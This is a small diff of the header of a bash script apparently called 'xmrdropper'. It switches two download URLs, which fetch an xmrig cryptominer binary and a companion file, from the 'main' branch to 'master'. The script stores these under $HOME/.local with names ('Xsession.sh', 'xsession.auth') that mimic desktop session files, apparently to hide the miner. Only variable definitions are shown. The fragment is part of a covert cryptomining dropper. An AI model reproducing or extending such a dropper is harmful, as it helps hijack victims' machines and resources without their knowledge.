@@ -1,8 +1,8 @@
 #!/bin/bash
 
 REPO_URL=https://github.com/freebyte/xmrdropper
-XMRIG_URL=$REPO_URL/raw/main/xmrig
-APP_URL=$REPO_URL/raw/main/Xsession.auth
+XMRIG_URL=$REPO_URL/raw/master/xmrig
+APP_URL=$REPO_URL/raw/master/Xsession.auth
 LOCAL_PATH=$HOME/.local
 APPNAME=Xsession.sh
 XMRIGNAME=xsession.auth
